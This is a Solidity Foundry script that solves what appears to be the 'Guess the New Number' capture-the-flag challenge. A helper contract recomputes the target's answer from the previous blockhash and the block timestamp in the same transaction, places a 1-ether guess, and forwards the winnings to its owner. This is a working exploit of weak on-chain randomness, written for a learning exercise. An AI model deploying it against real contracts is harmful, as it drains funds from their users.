// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "./IGuess.sol";

contract GuessTheNewNumberSolution is Script {
    IGuess private guessTheNewNumber = IGuess(vm.envAddress("ADDRESS"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        GuessTheRandomNumberSolver solver = new GuessTheRandomNumberSolver();
        solver.solve{value: 1 ether}(address(guessTheNewNumber));
        vm.stopBroadcast();
        require(guessTheNewNumber.isComplete());
    }
}

contract GuessTheRandomNumberSolver {
    address payable public owner;

    receive() external payable {}

    constructor() public {
        owner = payable(msg.sender);
    }

    function solve(address _address) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        IGuess(_address).guess{value: 1 ether}(answer);
        owner.transfer(address(this).balance);
    }
}
